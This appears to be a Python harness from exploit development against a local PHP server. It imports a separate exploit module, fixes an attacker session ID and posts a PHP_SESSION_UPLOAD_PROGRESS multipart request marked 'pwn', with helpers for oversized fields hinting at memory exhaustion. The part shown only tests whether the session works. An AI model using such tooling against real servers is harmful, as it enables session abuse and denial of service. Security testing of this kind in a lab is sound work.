import os
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart
t = Target("http://127.0.0.1:18113/index.php", timeout=120, verbose=False)
SID = b"attacksessionid0001"

def big_field():
    return {"name": "big", "data": b"B" * (12 * 1024 * 1024)}
def filepart():
    return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

# First: verify the session works at all (simple request with SID)
print("=== Simple session test (SID + progress, no OOM) ===")
parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
resp = t.post(build_multipart(parts, b"B1"), b"B1", read_cap=65536, timeout=30)
if b"\r\n\r\n" in resp:
    head, body = resp.split(b"\r\n\r\n", 1)
else:
    head, body = b"", resp
print("HEAD:", head.decode("latin1","replace")[:400])
print("BODY:", body[:150])
print("HAS Set-Cookie:", b"Set-Cookie" in head, " PHPSESSID:", b"PHPSESSID" in head)
